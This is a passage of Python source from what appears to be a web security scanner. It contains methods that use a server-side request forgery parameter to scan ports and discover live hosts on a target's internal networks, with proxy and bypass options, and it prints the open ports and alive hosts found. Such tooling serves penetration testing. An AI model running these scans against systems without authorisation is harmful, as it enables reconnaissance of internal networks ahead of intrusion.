        }

        scanner = SSRFPortScanner(
            target_url, param, target_ip, timeout, proxy)
        scan_results = scanner.scan_ports(ports, bypass_level)

        results["open_ports"] = scan_results.get("open", [])
        results["filtered"] = scan_results.get("filtered", [])
        results["timeout_ports"] = scan_results.get("timeout", [])

        if results["open_ports"]:
            results["vulnerable"] = True
            self._print(f"\n[SSRF] {len(results['open_ports'])} OPEN PORTS FOUND!", "bold red")
            for port_info in results["open_ports"]:
                self._print(
                    f"  [+] Port {port_info['port']}: OPEN "
                    f"(diff: {port_info.get('diff_length', 0)} bytes)",
                    "red"
                )
        else:
            self._print("\n[SSRF] No open ports found via SSRF", "green")

        return results

    def scan_ssrf_network(self, target_url: str, param: str,
                          cidr_ranges: List[str] = None, timeout: int = 5,
                          proxy: str = None) -> Dict:
        """Scan 68: Network discovery through SSRF.
        
        Discovers alive hosts on internal networks via SSRF.
        """
        self._print("\n[SSRF] Starting SSRF Network Discovery", "bold cyan")
        ranges = cidr_ranges or SSRFNetworkScanner.DEFAULT_RANGES
        self._print(f"[SSRF] Target: {target_url} | Ranges: {ranges}", "dim")

        results = {
            "target": target_url, "param": param,
            "ranges_scanned": ranges,
            "alive_hosts": [], "vulnerable": False,
        }

        scanner = SSRFNetworkScanner(target_url, param, timeout, proxy)
        scan_results = scanner.scan_network(cidr_ranges)

        results["alive_hosts"] = scan_results.get("alive_hosts", [])
        results["total_scanned"] = scan_results.get("total_scanned", 0)

        if results["alive_hosts"]:
            results["vulnerable"] = True
            self._print(
                f"\n[SSRF] {len(results['alive_hosts'])} ALIVE HOSTS FOUND!", "bold red")
            for host in results["alive_hosts"]:
                self._print(f"  [+] {host['ip']}: ALIVE", "red")
        else:
            self._print("\n[SSRF] No alive hosts found via SSRF", "green")

        return results
